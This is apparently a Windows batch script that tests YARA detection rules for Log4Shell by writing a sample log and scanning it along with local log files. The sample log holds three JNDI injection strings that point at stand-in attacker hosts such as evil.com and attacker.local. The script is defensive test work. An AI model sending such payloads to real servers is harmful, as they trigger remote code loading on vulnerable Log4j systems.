@echo off
echo YARA Scanning for Log4Shell patterns...
echo.

REM Create test log with exploit attempts
echo Creating test log with Log4Shell patterns...
echo User-Agent: ${jndi:ldap://attacker.local:1389/Exploit} > test-log4shell.log
echo X-Api-Version: ${jndi:ldap://10.0.0.8:1389/Evil} >> test-log4shell.log
echo POST /api?search=${jndi:ldap://evil.com/Payload} >> test-log4shell.log
echo.

REM Scan the test log
echo Scanning test log file...
yara64.exe detection-rules\log4shell-enhanced.yar test-log4shell.log

echo.
echo Scanning Java app output (if captured)...
if exist vulnerable-simple\app.log (
    yara64.exe detection-rules\log4shell-enhanced.yar vulnerable-simple\app.log
) else (
    echo No app.log found. Capture Java output: java SimpleVulnerable ^> app.log 2^>^&1
)

echo.
echo Scanning all .log and .txt files in current directory...
yara64.exe detection-rules\log4shell-enhanced.yar . -r --include="*.log" --include="*.txt"

echo.
echo Scan complete!
pause